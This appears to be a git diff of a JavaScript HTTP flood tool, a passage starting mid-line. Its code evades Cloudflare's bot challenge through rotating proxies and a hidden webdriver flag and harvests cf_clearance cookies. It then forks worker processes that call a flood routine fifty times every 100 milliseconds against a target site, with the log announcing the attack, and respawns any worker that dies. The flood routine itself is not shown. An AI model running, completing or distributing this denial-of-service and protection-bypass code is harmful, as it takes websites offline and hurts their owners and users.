@@ -473,4 +473,381 @@ function bypassCloudflareOnce(attemptNum) {
       resolve({
         cookies: [],
         userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        cfCle
+        cfClearance: null,
+        success: false,
+        attemptNum: attemptNum,
+        proxy: null
+      });
+      return;
+    }
+    const proxyParts = proxy.split(':');
+    const proxyHost = proxyParts[0];
+    const proxyPort = proxyParts[1];
+    const proxyUser = proxyParts.length === 4 ? proxyParts[2] : null;
+    const proxyPass = proxyParts.length === 4 ? proxyParts[3] : null;
+    try {
+      console.log(`${COLORS.yellow} m85.68: Starting bypass attempt #${attemptNum} (Retry ${retryCount + 1}/${maxRetries}) using proxy ${proxyHost}:${proxyPort}...${COLORS.reset}`);
+      const connectOptions = {
+        headless: false,
+        args: [
+          '--no-sandbox',
+          '--disable-setuid-sandbox',
+          '--disable-dev-shm-usage',
+          '--disable-accelerated-2d-canvas',
+          '--no-first-run',
+          '--no-zygote',
+          '--disable-gpu',
+          '--window-size=1920,1080',
+          `--proxy-server=http://${proxyHost}:${proxyPort}`
+        ],
+        turnstile: true,
+        connectOption: {
+          defaultViewport: null
+        }
+      };
+      if (proxyUser && proxyPass) {
+        connectOptions.args.push(`--proxy-auth=${proxyUser}:${proxyPass}`);
+      }
+      connect(connectOptions).then((resp) => {
+        response = resp;
+        browser = response.browser;
+        page = response.page;
+        page.evaluateOnNewDocument(() => {
+          Object.defineProperty(navigator, 'webdriver', {
+            get: () => undefined
+          });
+        });
+        console.log(`${COLORS.blue} m85.68: Accessing ${args.target} through proxy ${proxyHost}:${proxyPort}...${COLORS.reset}`);
+        page.goto(args.target, { 
+          waitUntil: 'domcontentloaded',
+          timeout: 120000
+        }).then(() => {
+          console.log(`${COLORS.yellow} m85.68: Checking Cloudflare challenge for ${proxy}...${COLORS.reset}`);
+          let challengeCompleted = false;
+          let checkCount = 0;
+          const maxChecks = 120;
+          function checkChallenge() {
+            if (challengeCompleted || checkCount >= maxChecks) {
+              setTimeout(() => {
+                page.cookies().then((cookies) => {
+                  console.log(`${COLORS.cyan} m85.68: Found ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s for proxy ${proxy}${COLORS.reset}`);
+                  const cfClearance = cookies.find((c) => c.name === "cf_clearance");
+                  if (cfClearance) {
+                    console.log(`${COLORS.green} m85.68: cf_clearance: ${cfClearance.value.substring(0, 30)}...${COLORS.reset}`);
+                  }
+                  page.evaluate(() => navigator.userAgent).then((userAgent) => {
+                    page.close().then(() => {
+                      browser.close().then(() => {
+                        resolve({
+                          cookies: cookies,
+                          userAgent: userAgent,
+                          cfClearance: cfClearance ? cfClearance.value : null,
+                          success: true,
+                          attemptNum: attemptNum,
+                          proxy: proxy
+                        });
+                      });
+                    });
+                  }).catch((evalError) => {
+                    console.log(`${COLORS.red} m85.68: Evaluation error after cookies: ${evalError.message}${COLORS.reset}`);
+                    resolve({
+                      cookies: [],
+                      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                      cfClearance: null,
+                      success: false,
+                      attemptNum: attemptNum,
+                      proxy: proxy
+                    });
+                  });
+                }).catch((cookieError) => {
+                  console.log(`${COLORS.red} m85.68: Cookie retrieval error: ${cookieError.message}${COLORS.reset}`);
+                  resolve({
+                    cookies: [],
+                    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    cfClearance: null,
+                    success: false,
+                    attemptNum: attemptNum,
+                    proxy: proxy
+                  });
+                });
+              }, 1000);
+              return;
+            }
+            setTimeout(async () => {
+              try {
+                await Promise.race([
+                  page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 5000 }).catch(() => null),
+                  delay(500)
+                ]);
+
+                const cookies = await page.cookies();
+                const cfClearance = cookies.find((c) => c.name === "cf_clearance");
+
+                if (cfClearance) {
+                  console.log(`${COLORS.green} m85.68: Found cookie after ${(checkCount * 0.5).toFixed(1)}s for proxy ${proxy}!${COLORS.reset}`);
+                  challengeCompleted = true;
+                  checkChallenge();
+                  return;
+                }
+
+                const result = await page.evaluate(() => {
+                  const title = (document.title || "").toLowerCase();
+                  const bodyText = (document.body && document.body.innerText || "").toLowerCase();
+                  
+                  if (title.indexOf("just a moment") !== -1 || 
+                      title.indexOf("checking") !== -1 ||
+                      bodyText.indexOf("checking your browser") !== -1 ||
+                      bodyText.indexOf("please wait") !== -1 ||
+                      bodyText.indexOf("cloudflare") !== -1) {
+                    return false;
+                  }
+                  
+                  return document.body && document.body.children.length > 3;
+                });
+
+                challengeCompleted = result;
+                checkCount++;
+
+                if (checkCount % 10 === 0) {
+                  console.log(`${COLORS.yellow} m85.68: Still checking... (${(checkCount * 0.5).toFixed(1)}s elapsed) for proxy ${proxy}${COLORS.reset}`);
+                }
+
+                checkChallenge();
+              } catch (evalError) {
+                console.log(`${COLORS.red} m85.68: Evaluation error: ${evalError.message}${COLORS.reset}`);
+                checkCount++;
+                checkChallenge();
+              }
+            }, 500);
+          }
+          
+          checkChallenge();
+        }).catch((navError) => {
+          console.log(`${COLORS.yellow} m85.68: Access warning for proxy ${proxy}: ${navError.message}${COLORS.reset}`);
+          if (navError.message.includes("net::ERR_INVALID_AUTH_CREDENTIALS") || 
+              navError.message.includes("net::ERR_PROXY_CONNECTION_FAILED")) {
+            global.failedProxies.add(proxy);
+            retryCount++;
+            try {
+              if (page) page.close().then(() => {
+                if (browser) browser.close().then(() => {
+                  if (retryCount < maxRetries) {
+                    tryBypass(resolve, reject);
+                  } else {
+                    resolve({
+                      cookies: [],
+                      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                      cfClearance: null,
+                      success: false,
+                      attemptNum: attemptNum,
+                      proxy: proxy
+                    });
+                  }
+                });
+              });
+            } catch (cleanupError) {
+              console.log(`${COLORS.red} m85.68: Cleanup error: ${cleanupError.message}${COLORS.reset}`);
+              if (retryCount < maxRetries) {
+                tryBypass(resolve, reject);
+              } else {
+                resolve({
+                  cookies: [],
+                  userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                  cfClearance: null,
+                  success: false,
+                  attemptNum: attemptNum,
+                  proxy: proxy
+                });
+              }
+            }
+          } else {
+            retryCount++;
+            if (retryCount < maxRetries) {
+              tryBypass(resolve, reject);
+            } else {
+              resolve({
+                cookies: [],
+                userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                cfClearance: null,
+                success: false,
+                attemptNum: attemptNum,
+                proxy: proxy
+              });
+            }
+          }
+        });
+      }).catch((error) => {
+        console.log(`${COLORS.red} m85.68: Bypass attempt #${attemptNum} (Retry ${retryCount + 1}/${maxRetries}) failed with proxy ${proxyHost}:${proxyPort}: ${error.message}${COLORS.reset}`);
+        global.failedProxies.add(proxy);
+        retryCount++;
+        
+        if (retryCount < maxRetries) {
+          tryBypass(resolve, reject);
+        } else {
+          resolve({
+            cookies: [],
+            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            cfClearance: null,
+            success: false,
+            attemptNum: attemptNum,
+            proxy: proxy
+          });
+        }
+      });
+    } catch (error) {
+      console.log(`${COLORS.red} m85.68: Bypass attempt #${attemptNum} (Retry ${retryCount + 1}/${maxRetries}) failed with proxy ${proxyHost}:${proxyPort}: ${error.message}${COLORS.reset}`);
+      global.failedProxies.add(proxy);
+      retryCount++;
+      
+      if (retryCount < maxRetries) {
+        tryBypass(resolve, reject);
+      } else {
+        resolve({
+          cookies: [],
+          userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          cfClearance: null,
+          success: false,
+          attemptNum: attemptNum,
+          proxy: proxy
+        });
+      }
+    }
+  }
+  return new Promise((resolve, reject) => {
+    tryBypass(resolve, reject);
+  });
+}
+
+function bypassCloudflareParallel() {
+  return new Promise((resolve, reject) => {
+    console.log(`${COLORS.magenta} m85.68: Starting Cloudflare Bypass (Unlimited Mode)${COLORS.reset}`);
+    const results = [];
+    let attemptCount = 0;
+    const concurrentBypassSessions = 10; // Keep the batch size of 10 concurrent sessions
+
+    function runBatch() {
+      // Check if there are any proxies left that haven't failed
+      const availableProxies = proxies.filter(proxy => !global.failedProxies.has(proxy));
+      if (availableProxies.length === 0) {
+        console.log(`${COLORS.red} m85.68: No more available proxies. Stopping bypass attempts.${COLORS.reset}`);
+        if (results.length === 0) {
+          console.log(`${COLORS.yellow} m85.68: No Cloudflare cookies obtained, using default header${COLORS.reset}`);
+          results.push({
+            cookies: [],
+            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            cfClearance: null,
+            success: true,
+            proxy: null // No proxy available
+          });
+        }
+        console.log(`\n${COLORS.green} m85.68: Total sessions obtained: ${results.length}${COLORS.reset}`);
+        resolve(results);
+        return;
+      }
+
+      const currentBatchSize = Math.min(concurrentBypassSessions, availableProxies.length);
+      console.log(`\n${COLORS.yellow} m85.68: Starting parallel batch (${currentBatchSize} sessions, ${availableProxies.length} proxies remaining)...${COLORS.reset}`);
+
+      const batchPromises = [];
+      for (let i = 0; i < currentBatchSize; i++) {
+        attemptCount++;
+        batchPromises.push(bypassCloudflareOnce(attemptCount));
+      }
+
+      Promise.all(batchPromises).then((batchResults) => {
+        batchResults.forEach((result) => {
+          if (result.success && result.cookies.length > 0) {
+            results.push(result);
+            console.log(`${COLORS.green} m85.68: Session #${result.attemptNum} successful with proxy ${result.proxy}! (Total: ${results.length})${COLORS.reset}`);
+          } else {
+            console.log(`${COLORS.red} m85.68: Session #${result.attemptNum} failed with proxy ${result.proxy}${COLORS.reset}`);
+          }
+        });
+
+        // Continue with the next batch after a delay
+        console.log(`${COLORS.yellow} m85.68: Waiting 2s before next batch...${COLORS.reset}`);
+        setTimeout(runBatch, 2000);
+      }).catch((batchError) => {
+        console.log(`${COLORS.red} m85.68: Error in batch processing: ${batchError.message}${COLORS.reset}`);
+        setTimeout(runBatch, 2000);
+      });
+    }
+
+    runBatch();
+  });
+}
+
+// Run flooder function
+function runFlooder() {
+  const bypassInfo = getNextProxy(global.bypassData || []);
+  if (!bypassInfo) return;
+  const cookieString = bypassInfo.cookies && bypassInfo.cookies.length > 0 ? bypassInfo.cookies.map((c) => `${c.name}=${c.value}`).join("; ") : "";
+  const userAgent = bypassInfo.userAgent || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+  const proxy = bypassInfo.proxy;
+  if (!proxy || global.failedProxies.has(proxy)) return;
+  console.log(`${COLORS.cyan} m85.68: Running flooder with proxy ${proxy}...${COLORS.reset}`);
+  flood(userAgent, cookieString, proxy);
+}
+
+// Initialize global stats
+global.startTime = Date.now();
+global.bypassData = [];
+global.failedProxies = new Set();
+global.proxyIndex = 0;
+
+// Main execution
+if (cluster.isMaster) {
+  printHeader();
+  bypassCloudflareParallel().then((bypassResults) => { 
+    global.bypassData = bypassResults;
+    console.log(`\n${COLORS.green} m85.68: Successfully obtained ${bypassResults.length} sessions!${COLORS.reset}`);
+    console.log(`${COLORS.magenta} m85.68: Starting attack on ${args.target}...${COLORS.reset}\n`);
+
+    global.startTime = Date.now();
+
+    for (let i = 0; i < args.threads; i++) {
+      const worker = cluster.fork();
+      worker.send({ 
+        type: 'bypassData', 
+        data: bypassResults,
+        proxies: proxies
+      });
+    }
+
+    cluster.on('exit', (worker) => {
+      const newWorker = cluster.fork();
+      newWorker.send({ 
+        type: 'bypassData', 
+        data: global.bypassData,
+        proxies: proxies
+      });
+    });
+  }).catch((error) => {
+    console.log(`${COLORS.red} m85.68: Fatal error in main execution: ${error.message}${COLORS.reset}`);
+    process.exit(1);
+  });
+} else {
+  let workerBypassData = [];
+  let workerProxies = [];
+  let attackInterval;
+  global.proxyIndex = 0;
+  process.on('message', (msg) => {
+    if (msg.type === 'bypassData') {
+      workerBypassData = msg.data;
+      workerProxies = msg.proxies;
+      global.bypassData = msg.data;
+      console.log(`${COLORS.cyan} m85.68: Worker received ${global.bypassData.length} sessions, starting attack interval...${COLORS.reset}`);
+      attackInterval = setInterval(() => {
+        for (let i = 0; i < 50; i++) {
+          runFlooder();
+        }
+      }, 100);
+    }
+  });
+}
+process.on('uncaughtException', (err) => {
+  console.log(`${COLORS.red} m85.68: Uncaught Exception: ${err.message}${COLORS.reset}`);
+});
+process.on('unhandledRejection', (reason, promise) => {
+  console.log(`${COLORS.red} m85.68: Unhandled Rejection: ${(reason.message || reason)}${COLORS.reset}`);
+});
